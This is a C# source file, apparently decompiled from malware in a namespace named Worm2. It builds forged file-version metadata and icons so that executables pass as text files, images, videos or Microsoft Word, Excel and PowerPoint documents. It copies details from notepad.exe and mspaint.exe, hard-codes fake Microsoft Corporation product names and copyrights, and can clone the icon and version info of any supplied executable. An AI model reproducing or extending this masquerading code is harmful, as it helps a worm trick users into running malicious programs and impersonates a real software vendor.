using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using Plugin.Properties;
using Toolbelt.Drawing;

namespace Worm2.Files;

internal class InformationFile
{
	public string exsitions;

	public string Icon;

	public Dictionary<string, string> stringFileInfo;

	public InformationFile(string exsitions)
	{
		this.exsitions = exsitions;
		string tempPath = Path.GetTempPath();
		switch (exsitions)
		{
		case ".txt":
		{
			FileVersionInfo versionInfo2 = FileVersionInfo.GetVersionInfo("C:\\Windows\\System32\\notepad.exe");
			stringFileInfo = new Dictionary<string, string>();
			stringFileInfo.Add("ProductName", string.IsNullOrEmpty(versionInfo2.ProductName) ? " " : versionInfo2.ProductName);
			stringFileInfo.Add("FileDescription", string.IsNullOrEmpty(versionInfo2.FileDescription) ? " " : versionInfo2.FileDescription);
			stringFileInfo.Add("CompanyName", string.IsNullOrEmpty(versionInfo2.CompanyName) ? " " : versionInfo2.CompanyName);
			stringFileInfo.Add("LegalCopyright", string.IsNullOrEmpty(versionInfo2.LegalCopyright) ? " " : versionInfo2.LegalCopyright);
			stringFileInfo.Add("LegalTrademarks", string.IsNullOrEmpty(versionInfo2.LegalTrademarks) ? " " : versionInfo2.LegalTrademarks);
			stringFileInfo.Add("Assembly Version", string.IsNullOrEmpty(versionInfo2.ProductVersion) ? " " : versionInfo2.ProductVersion);
			stringFileInfo.Add("InternalName", string.IsNullOrEmpty(versionInfo2.InternalName) ? " " : versionInfo2.InternalName);
			stringFileInfo.Add("OriginalFilename", string.IsNullOrEmpty(versionInfo2.OriginalFilename) ? " " : versionInfo2.OriginalFilename);
			stringFileInfo.Add("ProductVersion", string.IsNullOrEmpty(versionInfo2.ProductVersion) ? "5.12.3.82" : versionInfo2.ProductVersion);
			stringFileInfo.Add("FileVersion", "5.12.3.82");
			if (!File.Exists(Path.Combine(tempPath, "txt.icon")))
			{
				File.WriteAllBytes(Path.Combine(tempPath, "txt.icon"), Resource1.txt);
			}
			Icon = Path.Combine(tempPath, "txt.icon");
			break;
		}
		case ".png":
		case ".jpg":
		case ".jpeg":
		case ".gif":
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo("C:\\Windows\\System32\\mspaint.exe");
			stringFileInfo = new Dictionary<string, string>();
			stringFileInfo.Add("ProductName", string.IsNullOrEmpty(versionInfo.ProductName) ? " " : versionInfo.ProductName);
			stringFileInfo.Add("FileDescription", string.IsNullOrEmpty(versionInfo.FileDescription) ? " " : versionInfo.FileDescription);
			stringFileInfo.Add("CompanyName", string.IsNullOrEmpty(versionInfo.CompanyName) ? " " : versionInfo.CompanyName);
			stringFileInfo.Add("LegalCopyright", string.IsNullOrEmpty(versionInfo.LegalCopyright) ? " " : versionInfo.LegalCopyright);
			stringFileInfo.Add("LegalTrademarks", string.IsNullOrEmpty(versionInfo.LegalTrademarks) ? " " : versionInfo.LegalTrademarks);
			stringFileInfo.Add("Assembly Version", string.IsNullOrEmpty(versionInfo.ProductVersion) ? " " : versionInfo.ProductVersion);
			stringFileInfo.Add("InternalName", string.IsNullOrEmpty(versionInfo.InternalName) ? " " : versionInfo.InternalName);
			stringFileInfo.Add("OriginalFilename", string.IsNullOrEmpty(versionInfo.OriginalFilename) ? " " : versionInfo.OriginalFilename);
			stringFileInfo.Add("ProductVersion", string.IsNullOrEmpty(versionInfo.ProductVersion) ? "5.12.3.82" : versionInfo.ProductVersion);
			stringFileInfo.Add("FileVersion", "5.12.3.82");
			if (!File.Exists(Path.Combine(tempPath, "photo.icon")))
			{
				File.WriteAllBytes(Path.Combine(tempPath, "photo.icon"), Resource1.photo);
			}
			Icon = Path.Combine(tempPath, "photo.icon");
			break;
		}
		case ".mp4":
		case ".avi":
		case ".mkv":
			stringFileInfo = new Dictionary<string, string>();
			stringFileInfo.Add("ProductName", "Entertainment Platform");
			stringFileInfo.Add("FileDescription", "Video Application");
			stringFileInfo.Add("CompanyName", "Microsoft Corporation");
			stringFileInfo.Add("LegalCopyright", "cMicrosoft Corporation.  All rights reserved.");
			stringFileInfo.Add("LegalTrademarks", "");
			stringFileInfo.Add("Assembly Version", "10.22091.1006.2209");
			stringFileInfo.Add("InternalName", "Video Application");
			stringFileInfo.Add("OriginalFilename", "Video.UI.exe");
			stringFileInfo.Add("ProductVersion", "10.22091.1006.2209");
			stringFileInfo.Add("FileVersion", "5.12.3.82");
			if (!File.Exists(Path.Combine(tempPath, "video.icon")))
			{
				File.WriteAllBytes(Path.Combine(tempPath, "video.icon"), Resource1.video);
			}
			Icon = Path.Combine(tempPath, "video.icon");
			break;
		case ".xlsx":
		case ".xls":
		case ".xlsm":
		case ".csv":
			stringFileInfo = new Dictionary<string, string>();
			stringFileInfo.Add("ProductName", "Microsoft Excel");
			stringFileInfo.Add("FileDescription", "Microsoft Excel");
			stringFileInfo.Add("CompanyName", "Microsoft Corporation");
			stringFileInfo.Add("LegalCopyright", "cMicrosoft Corporation.  All rights reserved.");
			stringFileInfo.Add("LegalTrademarks", "");
			stringFileInfo.Add("Assembly Version", "10.291.10.9");
			stringFileInfo.Add("InternalName", "Microsoft Excel");
			stringFileInfo.Add("OriginalFilename", "Microsoft.Excel.exe");
			stringFileInfo.Add("ProductVersion", "10.291.10.9");
			stringFileInfo.Add("FileVersion", "5.12.3.82");
			if (!File.Exists(Path.Combine(tempPath, "excel.icon")))
			{
				File.WriteAllBytes(Path.Combine(tempPath, "excel.icon"), Resource1.excel);
			}
			Icon = Path.Combine(tempPath, "excel.icon");
			break;
		case ".docx":
		case ".doc":
		case ".rtf":
			stringFileInfo = new Dictionary<string, string>();
			stringFileInfo.Add("ProductName", "Microsoft Word");
			stringFileInfo.Add("FileDescription", "Microsoft Word");
			stringFileInfo.Add("CompanyName", "Microsoft Corporation");
			stringFileInfo.Add("LegalCopyright", "cMicrosoft Corporation.  All rights reserved.");
			stringFileInfo.Add("LegalTrademarks", "");
			stringFileInfo.Add("Assembly Version", "10.291.10.9");
			stringFileInfo.Add("InternalName", "Microsoft Word");
			stringFileInfo.Add("OriginalFilename", "Microsoft.Word.exe");
			stringFileInfo.Add("ProductVersion", "10.291.10.9");
			stringFileInfo.Add("FileVersion", "5.12.3.82");
			if (!File.Exists(Path.Combine(tempPath, "word.icon")))
			{
				File.WriteAllBytes(Path.Combine(tempPath, "word.icon"), Resource1.word);
			}
			Icon = Path.Combine(tempPath, "word.icon");
			break;
		case ".pptx":
		case ".ppt":
		case ".ppsx":
		case ".potx":
			stringFileInfo = new Dictionary<string, string>();
			stringFileInfo.Add("ProductName", "Microsoft Powerpoint");
			stringFileInfo.Add("FileDescription", "Microsoft Powerpoint");
			stringFileInfo.Add("CompanyName", "Microsoft Corporation");
			stringFileInfo.Add("LegalCopyright", "cMicrosoft Corporation.  All rights reserved.");
			stringFileInfo.Add("LegalTrademarks", "");
			stringFileInfo.Add("Assembly Version", "10.291.10.9");
			stringFileInfo.Add("InternalName", "Microsoft Powerpoint");
			stringFileInfo.Add("OriginalFilename", "Microsoft.Powerpoint.exe");
			stringFileInfo.Add("ProductVersion", "10.291.10.9");
			stringFileInfo.Add("FileVersion", "5.12.3.82");
			if (!File.Exists(Path.Combine(tempPath, "powerpoint.icon")))
			{
				File.WriteAllBytes(Path.Combine(tempPath, "powerpoint.icon"), Resource1.powerpoint);
			}
			Icon = Path.Combine(tempPath, "powerpoint.icon");
			break;
		}
	}

	public InformationFile(byte[] file)
	{
		string text = Path.GetTempFileName() + ".exe";
		Icon = Path.GetTempFileName() + ".ico";
		exsitions = ".exe";
		File.WriteAllBytes(text, file);
		using (FileStream stream = new FileStream(Icon, FileMode.Create))
		{
			IconExtractor.Extract1stIconTo(text, stream);
		}
		FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(text);
		stringFileInfo = new Dictionary<string, string>();
		stringFileInfo.Add("ProductName", string.IsNullOrEmpty(versionInfo.ProductName) ? " " : versionInfo.ProductName);
		stringFileInfo.Add("FileDescription", string.IsNullOrEmpty(versionInfo.FileDescription) ? " " : versionInfo.FileDescription);
		stringFileInfo.Add("CompanyName", string.IsNullOrEmpty(versionInfo.CompanyName) ? " " : versionInfo.CompanyName);
		stringFileInfo.Add("LegalCopyright", string.IsNullOrEmpty(versionInfo.LegalCopyright) ? " " : versionInfo.LegalCopyright);
		stringFileInfo.Add("LegalTrademarks", string.IsNullOrEmpty(versionInfo.LegalTrademarks) ? " " : versionInfo.LegalTrademarks);
		stringFileInfo.Add("Assembly Version", string.IsNullOrEmpty(versionInfo.ProductVersion) ? " " : versionInfo.ProductVersion);
		stringFileInfo.Add("InternalName", string.IsNullOrEmpty(versionInfo.InternalName) ? " " : versionInfo.InternalName);
		stringFileInfo.Add("OriginalFilename", string.IsNullOrEmpty(versionInfo.OriginalFilename) ? " " : versionInfo.OriginalFilename);
		stringFileInfo.Add("ProductVersion", string.IsNullOrEmpty(versionInfo.ProductVersion) ? " " : versionInfo.ProductVersion);
		stringFileInfo.Add("FileVersion", string.IsNullOrEmpty(versionInfo.FileVersion) ? " " : versionInfo.FileVersion);
		File.Delete(text);
	}
}
